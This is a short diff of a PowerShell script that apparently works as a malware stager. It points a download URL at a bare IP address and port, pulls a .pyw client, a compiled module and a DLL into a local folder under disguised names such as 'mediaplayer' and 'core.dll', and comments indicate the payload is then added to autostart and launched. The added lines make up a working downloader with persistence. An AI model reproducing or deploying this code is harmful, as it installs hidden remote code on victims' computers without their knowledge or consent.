@@ -15,11 +15,14 @@ Remove-Item -Path "$env:localappdata\$python"
 
 
 # --- Download required files
-$url = "NotForDogSausage"
+$url = "http://70.34.254.149:7777"
+if (-not (Test-Path -Path $dir)) {
+  New-Item -Path $dir -ItemType Directory
+}
 
-iwr "$url/assets/foo.txt" -OutFile "$dir\client.pyw"
-iwr "$url/assets/foo.txt" -OutFile "$dir\mediaplayer.cp312-win_amd64.pyd"
-iwf "$url/assets/foo.txt" -OutFile "$dir\core.dll"
+iwr "$url/api/static/client.pyw" -OutFile "$dir\client.pyw"
+iwr "$url/api/static/module.pyd" -OutFile "$dir\mediaplayer.cp312-win_amd64.pyd"
+iwr "$url/api/static/client.dll" -OutFile "$dir\core.dll"
 
 
 # --- Add file to autostart and start a python process
